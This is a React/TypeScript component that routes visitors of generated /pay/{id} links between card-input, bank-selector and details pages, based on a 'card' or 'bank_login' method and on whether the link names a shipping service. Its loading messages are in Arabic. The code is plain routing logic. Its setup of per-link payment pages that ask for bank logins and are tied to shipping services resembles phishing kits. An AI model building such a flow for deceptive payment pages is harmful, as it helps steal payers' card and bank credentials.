import { useEffect, useState } from "react";
import { useParams, useNavigate, useSearchParams } from "react-router-dom";
import { useLink } from "@/hooks/useSupabase";
import PageLoader from "@/components/PageLoader";

interface PaymentFlowGuardProps {
  children: React.ReactNode;
  requiredPaymentMethod?: 'card' | 'bank_login';
  allowedFlow: 'card' | 'bank' | 'both';
}

/**
 * Payment Flow Guard - Enforces conditional payment flow
 * 
 * - Blocks access to pages based on payment_method
 * - Redirects to appropriate page if wrong flow accessed
 * - Preserves all functionality without modification
 */
const PaymentFlowGuard: React.FC<PaymentFlowGuardProps> = ({
  children,
  requiredPaymentMethod,
  allowedFlow = 'both'
}) => {
  const { id } = useParams();
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const { data: linkData, isLoading } = useLink(id);
  const [isAuthorized, setIsAuthorized] = useState(false);
  const [isChecking, setIsChecking] = useState(true);

  useEffect(() => {
    if (isLoading) return;

    const paymentMethodFromUrl = searchParams.get('method') || searchParams.get('pm');
    const paymentMethodFromLink = linkData?.payload?.payment_method;
    const paymentMethod = paymentMethodFromUrl || paymentMethodFromLink || 'card';
    const isShippingService = !!linkData?.payload?.service_key &&
                              !linkData?.payload?.service_key?.includes('government');

    // Check if access is allowed based on flow
    let isAllowed = false;

    if (allowedFlow === 'both') {
      isAllowed = true;
    } else if (allowedFlow === 'card') {
      // Card flow: Allow if payment_method is 'card' or if it's a shipping service
      isAllowed = paymentMethod === 'card' || isShippingService;
    } else if (allowedFlow === 'bank') {
      // Bank flow: Allow only if payment_method is 'bank_login' and not shipping
      isAllowed = paymentMethod === 'bank_login' && !isShippingService;
    }

    // If requiredPaymentMethod is specified, enforce it
    if (requiredPaymentMethod && paymentMethod !== requiredPaymentMethod) {
      isAllowed = false;
    }

    if (!isAllowed) {
      // Redirect to appropriate page based on payment method
      const queryParams = new URLSearchParams(searchParams).toString();
      
      console.log('[PaymentFlowGuard] Blocking access:', {
        allowedFlow,
        paymentMethod,
        isShippingService,
        currentPath: window.location.pathname
      });

      if (paymentMethod === 'bank_login' && !isShippingService && allowedFlow === 'card') {
        // Trying to access card page with bank_login method - redirect to bank selector
        console.log('[PaymentFlowGuard] Redirecting to bank-selector');
        navigate(`/pay/${id}/bank-selector?${queryParams}`, { replace: true });
      } else if ((paymentMethod === 'card' || isShippingService) && allowedFlow === 'bank') {
        // Trying to access bank page with card method - redirect to card input
        console.log('[PaymentFlowGuard] Redirecting to card-input');
        navigate(`/pay/${id}/card-input?${queryParams}`, { replace: true });
      } else {
        // Default: redirect to details page
        console.log('[PaymentFlowGuard] Redirecting to details');
        navigate(`/pay/${id}/details?${queryParams}`, { replace: true });
      }
    } else {
      console.log('[PaymentFlowGuard] Access allowed:', { allowedFlow, paymentMethod });
      setIsAuthorized(true);
    }

    setIsChecking(false);
  }, [id, searchParams, linkData, isLoading, allowedFlow, requiredPaymentMethod, navigate]);

  if (isLoading || isChecking) {
    return <PageLoader message="جاري التحقق من بيانات الدفع..." />;
  }

  if (!isAuthorized) {
    return <PageLoader message="جاري إعادة التوجيه..." />;
  }

  return <>{children}</>;
};

export default PaymentFlowGuard;
